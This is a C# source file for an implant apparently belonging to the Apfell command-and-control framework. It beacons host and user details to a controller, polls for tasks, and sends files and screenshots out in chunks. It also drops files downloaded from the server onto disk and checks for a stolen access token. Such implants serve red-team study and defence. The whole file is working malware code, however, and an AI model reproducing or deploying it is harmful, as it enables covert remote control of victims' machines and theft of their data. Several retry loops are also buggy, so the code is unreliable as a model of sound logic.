using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace SaltedCaramel
{
    internal struct CallbackResponse
    {
        public string status;
        public string id;
    }

    internal struct TaskResponse
    {
        public string response;
        public string id;

        public TaskResponse(string response, string id)
        {
            this.response = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(response));
            this.id = id;
        }
    }

    /// <summary>
    /// Class for the response we get when downloading a file
    /// </summary>
    internal struct DownloadResponse
    {
        public string file_id { get; set; }
    }

    internal struct FileChunk
    {
        public int chunk_num;
        public string file_id;
        public string chunk_data;
    }

    /// <summary>
    /// This class contains all methods used by the CaramelImplant
    /// </summary>
    internal class SaltedCaramelImplant
    {
        public string callbackId { get; set; }
        public string endpoint { get; set; }
        public string host { get; set; }
        public string ip { get; set; }
        public int pid { get; set; }
        public int sleep { get; set; }
        public string user { get; set; }
        public string uuid { get; set; }
        public string domain { get; set; }
        public string os { get; set; }
        public string architecture { get; set; }
        private int retry { get; set; }
        internal byte[] PSK { get; set; }
        private SaltedCaramelCrypto crypto = new SaltedCaramelCrypto();

        /// <summary>
        /// Post a response to the Apfell endpoint
        /// </summary>
        /// <param name="taskresp">The response to post to the endpoint</param>
        /// <returns>String with the Apfell server's reply</returns>
        public string PostResponse(TaskResponse taskresp)
        {
            string endpoint = this.endpoint + "responses/" + taskresp.id;
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                string json = JsonConvert.SerializeObject(taskresp);
                string encrypted = crypto.Encrypt(json);
                string result = crypto.Decrypt(HTTP.Post(endpoint, encrypted));
                Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.id}: {result}");
                if (result.Contains("success"))
                    // If it was successful, return the result
                    return result;
                else
                {
                    // If we didn't get success, retry and increment counter
                    while (retry < 20)
                    {
                        Debug.WriteLine($"[!] PostResponse - ERROR: Unable to post task response for {taskresp.id}, retrying...");
                        Thread.Sleep(this.sleep);
                        this.PostResponse(taskresp);
                    }
                    retry++;
                    throw (new Exception("[!] PostResponse - ERROR: Retries exceeded"));
                }
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }

        }

        public void SendComplete(string taskId)
        {
            Debug.WriteLine($"[+] SendComplete - Sending task complete for {taskId}");
            TaskResponse completeResponse = new TaskResponse("{\"completed\": true}", taskId);
            this.PostResponse(completeResponse);
        }

        public void SendError(string taskId, string error)
        {
            Debug.WriteLine($"[+] SendError - Sending error for {taskId}: {error}");
            TaskResponse errorResponse = new TaskResponse("{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}", taskId);
            this.PostResponse(errorResponse);
        }

        /// <summary>
        /// Send a file to the Apfell server
        /// </summary>
        /// <param name="taskId">The task ID for the file download</param>
        /// <param name="filepath">The file path to download</param>
        public void SendFile(string taskId, string filepath)
        {
            try // Try block for file upload task
            {
                // Get file info to determine file size
                FileInfo fileInfo = new FileInfo(filepath);
                long size = fileInfo.Length;
                Debug.WriteLine($"[+] SendFile - DOWNLOADING: {filepath}, {size} bytes");

                // Determine number of 512kb chunks to send
                long total_chunks = size / 512000;
                // HACK: Dumb workaround because longs don't have a ceiling operation
                if (total_chunks == 0)
                    total_chunks = 1;
                Debug.WriteLine($"[+] SendFile - File size = {size} ({total_chunks} chunks)");

                // Send number of chunks associated with task to Apfell server
                // Response will have the file ID to send file with
                TaskResponse initial = new TaskResponse("{\"total_chunks\": " + total_chunks + ", \"task\": \"" + taskId + "\"}", taskId);
                DownloadResponse reply = JsonConvert.DeserializeObject<DownloadResponse>(PostResponse(initial));
                Debug.WriteLine($"[-] SendFile - Received reply, file ID: " + reply.file_id);


                // Send file in chunks
                for (int i = 0; i < total_chunks; i++)
                {
                    byte[] chunk = null;
                    long pos = i * 512000;

                    // We need to use a FileStream in case our file size in bytes is larger than an Int32
                    // With a filestream, we can specify a position as a long, and then use Read() normally
                    using (FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        fs.Position = pos;

                        // If this is the last chunk, size will be the remaining bytes
                        if (i == total_chunks - 1)
                        {
                            chunk = new byte[size - (i * 512000)];
                            int chunkSize = chunk.Length;
                            fs.Read(chunk, 0, chunkSize);
                        }
                        // Otherwise we'll read 512kb from the file
                        else
                        {
                            chunk = new byte[512000];
                            fs.Read(chunk, 0, 512000);
                        }
                    }

                    // Convert chunk to base64 blob and create our FileChunk
                    FileChunk fc = new FileChunk();
                    fc.chunk_num = i;
                    fc.file_id = reply.file_id;
                    fc.chunk_data = Convert.ToBase64String(chunk);

                    // Send our FileChunk to Apfell server
                    TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fc), taskId);
                    Debug.WriteLine($"[+] SendFile - CHUNK SENT: {fc.chunk_num}");
                    Debug.WriteLine($"[-] SendFile - RESPONSE: {this.PostResponse(response)}");
                    // Make sure we respect the sleep setting
                    Thread.Sleep(this.sleep);
                }


                // Tell the Apfell server file transfer is done
                this.SendComplete(taskId);
                Debug.WriteLine($"[+] SendFile - File transfer complete: {filepath}");
            }
            catch (Exception e) // Catch any exception from file upload
            {
                // Something failed, so we need to tell the server about it
                this.SendError(taskId, e.Message);
                Debug.WriteLine($"[!] SendFile - ERROR: {e.Message}");
            }
        }

        public void SendScreenshot(string taskId, byte[] screenshot)
        {
            try // Try block for HTTP request
            {
                TaskResponse initial = new TaskResponse("{\"total_chunks\": " + 1 + ", \"task\":\"" + taskId + "\"}", taskId);
                DownloadResponse reply = JsonConvert.DeserializeObject<DownloadResponse>(PostResponse(initial));
                Debug.WriteLine($"[-] SendScreenshot - Received reply, file ID: " + reply.file_id);

                // Convert chunk to base64 blob and create our FileChunk
                FileChunk fc = new FileChunk();
                fc.chunk_num = 1;
                fc.file_id = reply.file_id;
                fc.chunk_data = Convert.ToBase64String(screenshot);

                // Send our FileChunk to Apfell server
                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fc), taskId);
                Debug.WriteLine($"[+] SendScreenshot - CHUNK SENT: {fc.chunk_num}");
                Debug.WriteLine($"[-] SendScreenshot - RESPONSE: {this.PostResponse(response)}");

                // Tell the Apfell server file transfer is done
                this.SendComplete(taskId);
            }
            catch (Exception e) // Catch exceptions from HTTP requests
            {
                // Something failed, so we need to tell the server about it
                this.SendError(taskId, e.Message);
                Debug.WriteLine($"[!] SendScreenshot - ERROR: {e.Message}");
            }
        }

        /// <summary>
        /// Download file from Apfell controller to implant
        /// </summary>
        /// <param name="file_id">The file ID to download.</param>
        /// <param name="filepath">The path to drop the file on disk.</param>
        /// <param name="taskId">The task ID associated with this task.</param>
        internal void GetFile(string file_id, string filepath, string taskId)
        {
            string fileEndpoint = this.endpoint + "files/callback/" + this.callbackId;
            try // Try block for HTTP request
            {
                string json = "{\"file_id\": \"" + file_id + "\"}";
                // Encrypt json to send to server
                string encrypted = crypto.Encrypt(json);

                string result = crypto.Decrypt(HTTP.Post(fileEndpoint, encrypted));
                byte[] output = Convert.FromBase64String(result);
                try // Try block for writing file to disk
                {
                    // Write file to disk
                    File.WriteAllBytes(filepath, output);
                    this.SendComplete(taskId);
                    Debug.WriteLine("[+] GetFile - File written: " + filepath);
                }
                catch (Exception e) // Catch exceptions from file write
                {
                    // Something failed, so we need to tell the server about it
                    this.SendError(taskId, e.Message);
                    Debug.WriteLine("[!] GetFile - ERROR: " + e.Message);
                }
            }
            catch (Exception e) // Catch exceptions from HTTP request
            {
                // Something failed, so we need to tell the server about it
                this.SendError(taskId, e.Message);
                Debug.WriteLine("[!] GetFile - ERROR: " + e.Message);
            }
        }

        /// <summary>
        /// Send initial implant callback, different from normal task response
        /// because we need to get the implant ID from Apfell server
        /// </summary>
        public void InitializeImplant()
        {
            string initEndpoint = this.endpoint + "crypto/aes_psk/" + this.uuid;
            this.retry = 0;

            crypto.PSK = this.PSK;
            try // Try block for HTTP request
            {
                // Get JSON string for implant
                // Format: {"user":"username", "host":"hostname", "pid":<pid>, "ip":<ip>, "uuid":<uuid>}
                string json = JsonConvert.SerializeObject(this);
                Debug.WriteLine($"[+] InitializeImplant - Sending {json} to {initEndpoint}");

                // Encrypt json to send to server
                string encrypted = crypto.Encrypt(json);
                
                string result = crypto.Decrypt(HTTP.Post(initEndpoint, encrypted));

                if (result.Contains("success"))
                {
                    // If it was successful, initialize implant
                    // Response is { "status": "success", "id": <id> }
                    CallbackResponse resultJSON = JsonConvert.DeserializeObject<CallbackResponse>(result);
                    this.callbackId = resultJSON.id;
                    Debug.WriteLine($"[-] InitializeImplant - INITIALIZE RESPONSE: {resultJSON.status}");
                    Debug.WriteLine($"[-] InitializeImplant - Callback ID is: {this.callbackId}");
                    retry = 0;
                    return;
                }
                else
                {
                    // If we didn't get success, retry and increment counter
                    while (retry < 20)
                    {
                        Debug.WriteLine("[!] InitializeImplant - ERROR: Unable to initialize implant, retrying...");
                        Thread.Sleep(this.sleep);
                        this.InitializeImplant();
                    }
                    retry++;
                    throw (new Exception("[!] InitializeImplant - ERROR: Retries exceeded when initializing implant"));
                }
            }
            catch (Exception e) // Catch exceptions from HTTP request
            {
                Debug.WriteLine(e.Message);
            }
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        public SaltedCaramelTask CheckTasking()
        {
            string taskEndpoint = this.endpoint + "tasks/callback/" + this.callbackId + "/nextTask";
            try // Try block for checking tasks (throws if retries exceeded)
            {
                while (retry < 20)
                {
                    try // Try block for HTTP request
                    {
                        SaltedCaramelTask task = JsonConvert.DeserializeObject<SaltedCaramelTask>(crypto.Decrypt(HTTP.Get(taskEndpoint)));
                        retry = 0;
                        if (task.command != "none")
                            Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
                        return task;
                    }
                    catch (Exception e) // Catch exceptions from HTTP request
                    {
                        retry++;
                        Debug.WriteLine("[!] CheckTasking - ERROR: " + e.Message + ", retrying...");
                        Thread.Sleep(this.sleep);
                        this.CheckTasking();
                    }
                }
                throw new Exception();
            }
            catch // Catch exception when retries exceeded
            {
                Debug.WriteLine("[!] CheckTasking - ERROR: retries exceeded.");
                return null;
            }
        }

        public bool hasAlternateToken()
        {
            if (Token.stolenHandle != IntPtr.Zero)
                return true;
            else return false;
        }
    }
}
